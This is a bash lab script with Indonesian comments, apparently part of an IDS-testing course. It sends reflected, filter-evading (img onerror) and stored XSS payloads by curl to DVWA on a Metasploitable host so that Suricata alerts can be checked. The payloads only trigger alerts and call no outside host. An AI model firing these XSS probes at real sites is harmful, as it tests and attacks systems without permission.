#!/bin/bash

# =================================================================
# MODUL 05: CROSS-SITE SCRIPTING (XSS)
# Strategi: 3 Level Depth (Reflected, Obfuscated, Stored/POST)
# Target: DVWA (XSS Reflected & Stored)
# =================================================================

# KONFIGURASI
TARGET_IP="192.168.1.XXX"   # Ganti dengan IP Metasploitable
# Masukkan PHPSESSID dari login DVWA (Sama seperti modul SQLmap)
COOKIE="security=low; PHPSESSID=ganti_dengan_session_id_anda"
LOG_FILE="logs/xss_session_$(date +%F).log"

# Warna untuk Tampilan Laporan
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m' # No Color

echo "[+] [05_XSS] Memulai Skenario XSS Injection..."
echo "[+] Target IP: $TARGET_IP"

# Cek Cookie
# FIX: Memperbaiki logika string matching
if [[ "$COOKIE" == *"ganti_dengan"* ]]; then
   echo -e "${RED}[!] WARNING: Cookie belum di-set! Script akan gagal login DVWA.${NC}"
   sleep 5
fi

# -----------------------------------------------------------------
# LEVEL 1: REFLECTED XSS (BASIC)
# Tujuan: Menguji deteksi tag standar <script> di URL (GET).
# Payload: <script>alert('XSS')</script>
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 1] Running Reflected XSS (Tag Script Standar)...${NC}"

PAYLOAD_RAW="<script>alert('XSS')</script>"
PAYLOAD_ENC="%3Cscript%3Ealert('XSS')%3C%2Fscript%3E"
URL="http://$TARGET_IP/dvwa/vulnerabilities/xss_r/?name=$PAYLOAD_ENC"

# TAMPILKAN LAPORAN
echo -e "${YELLOW}    [Payload Asli]   : $PAYLOAD_RAW${NC}"
echo -e "${YELLOW}    [Payload Kirim]  : $PAYLOAD_ENC${NC}"
echo -e "${YELLOW}    [Metode]         : HTTP GET${NC}"

# Eksekusi
curl -s -b "$COOKIE" "$URL" -o logs/xss_lvl1.html
echo "    -> Selesai. (Harapan: Alert ET WEB_SERVER Script tag in URI)"
sleep 5

# -----------------------------------------------------------------
# LEVEL 2: REFLECTED XSS (EVASION / POLYGLOT)
# Tujuan: Menguji rule yang terlalu spesifik pada tag <script>.
# Teknik: Menggunakan tag gambar (<img onerror>) atau SVG.
# Payload: <img src=x onerror=alert(1)>
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 2] Running Evasion XSS (Image OnError Tag)...${NC}"

# FIX: Mendefinisikan payload khusus Level 2 (di script lama anda masih pakai payload lvl 1)
PAYLOAD_RAW="<img src=x onerror=alert(1)>"
PAYLOAD_ENC="%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"
URL="http://$TARGET_IP/dvwa/vulnerabilities/xss_r/?name=$PAYLOAD_ENC"

# TAMPILKAN LAPORAN
echo -e "${YELLOW}    [Payload Asli]   : $PAYLOAD_RAW${NC}"
echo -e "${YELLOW}    [Payload Kirim]  : $PAYLOAD_ENC${NC}"
echo -e "${YELLOW}    [Info Teknik]    : Menggunakan Event Handler 'onerror' (bukan tag script)${NC}"

# Eksekusi
curl -s -b "$COOKIE" "$URL" -o logs/xss_lvl2.html
echo "    -> Selesai. (Harapan: Deteksi via pola 'onerror' atau atribut event)"
sleep 5

# -----------------------------------------------------------------
# LEVEL 3: STORED XSS (POST METHOD)
# Tujuan: Menguji deteksi pada HTTP BODY (Bukan URL).
# Teknik: Mengirim payload via POST ke Guestbook DVWA.
# Payload: Cookie Stealer simulation
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 3] Running Stored XSS via POST (HTTP Body)...${NC}"

# FIX: Memperbaiki nama variabel URL (URL_STORE -> URL_STORED)
URL_STORED="http://$TARGET_IP/dvwa/vulnerabilities/xss_s/"
# FIX: Memperbaiki nama variabel Body (PAYLOAD_BOD -> PAYLOAD_BODY)
PAYLOAD_RAW="<script>alert(document.cookie)</script>"
PAYLOAD_BODY="txtName=Hacker&mtxMessage=$PAYLOAD_RAW&btnSign=Sign+Guestbook"

# TAMPILKAN LAPORAN
echo -e "${YELLOW}    [Target URL]     : $URL_STORED${NC}"
echo -e "${YELLOW}    [POST Data Body] : $PAYLOAD_BODY${NC}"
echo -e "${YELLOW}    [Info Teknik]    : Payload disisipkan di dalam Body Request (bukan URL)${NC}"

# Eksekusi (FIX: Menggunakan variabel yang sudah diperbaiki)
curl -s -X POST -b "$COOKIE" -d "$PAYLOAD_BODY" "$URL_STORED" -o logs/xss_lvl3.html
echo "    -> Selesai. (Harapan: Suricata menginspeksi HTTP Request Body)"

echo "[+] [05_XSS] Skenario Selesai pada $(date)"
echo "-----------------------------------------------------------"